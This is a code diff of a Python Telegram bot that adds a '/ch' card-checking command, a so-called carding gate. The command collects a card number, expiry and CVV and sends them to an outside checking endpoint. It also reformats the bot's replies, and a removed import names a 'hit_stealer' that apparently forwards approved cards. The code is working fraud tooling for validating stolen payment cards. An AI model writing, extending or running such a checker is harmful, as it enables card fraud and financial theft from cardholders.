@@ -3,15 +3,6 @@ import time
 import asyncio
 from pyrogram import Client, filters
 
-# Assuming these are available in the environment or need to be mocked
-# from FUNC.usersdb_func import *
-# from FUNC.defs import *
-# from TOOLS.check_all_func import *
-# from TOOLS.getbin import *
-# from .response import *
-# from .gate import *
-# from BOT.tools.hit_stealer import send_hit_if_approved
-
 # Mocking necessary functions for standalone script generation
 async def check_all_thing(Client, message): return [True, "user"]
 async def getmessage(message): return ["4100400157539308", "08", "2026", "126"]
@@ -38,7 +29,6 @@ async def chaos_auth_cmd(Client, message):
         checkall = await check_all_thing(Client, message)
 
         gateway = "Chaos Auth 💥"
-        endpoint_url = f"https://onyxenvbot.up.railway.app/chaos/key=yashikaaa/cc={fullcc}"
 
         if checkall[0] == False:
             return
@@ -46,13 +36,16 @@ async def chaos_auth_cmd(Client, message):
         role = checkall[1]
         getcc = await getmessage(message)
         if getcc == False:
-            resp = f"""<b>\nGate Name: {gateway} ♻️\nCMD: /ch\n\nMessage: No CC Found in your input ❌\n\nUsage: /ch cc|mes|ano|cvv</b>"""
+            resp = f"""〈<a href='tg://user?id={user_id}'>꫟</a>〉-» 𝘾𝙝𝙖𝙤𝙨 𝘼𝙪𝙩𝙝 - CHECK\n\n〈♻️〉𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» {gateway} \n\n<a href='tg://user?id={user_id}'>╰┈➤</a> 𝙁𝙤𝙧𝙢𝙖𝙩 -» /ch cc|month|year|cvc"""
             await message.reply_text(resp, message.id)
             return
 
         cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
         fullcc = f"{cc}|{mes}|{ano}|{cvv}"
         bin6 = cc[:6]  # BIN for easy reference
+        
+        # Now define endpoint_url after fullcc is defined
+        endpoint_url = f"https://onyxenvbot.up.railway.app/chaos/key=yashikaaa/cc={fullcc}"
 
         firstresp = f"""\n↯ Checking.\n\n- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> \n- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>\n- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□\n</b>\n"""
         # await asyncio.sleep(0.5)
@@ -67,12 +60,9 @@ async def chaos_auth_cmd(Client, message):
         start = time.perf_counter()
         session = httpx.AsyncClient(timeout=30, follow_redirects=True)
         
-        # Prepare the data for the POST request
-        cc_data = {"cc": fullcc}
-        
-        # Make the POST request to the specific gateway endpoint
+        # Make the GET request to the specific gateway endpoint
         try:
-            response_obj = await session.post(endpoint_url, json=cc_data)
+            response_obj = await session.get(endpoint_url)
             result_json = response_obj.json()
             status = result_json.get("status", "Unknown")
             response = result_json.get("response", "No response message")
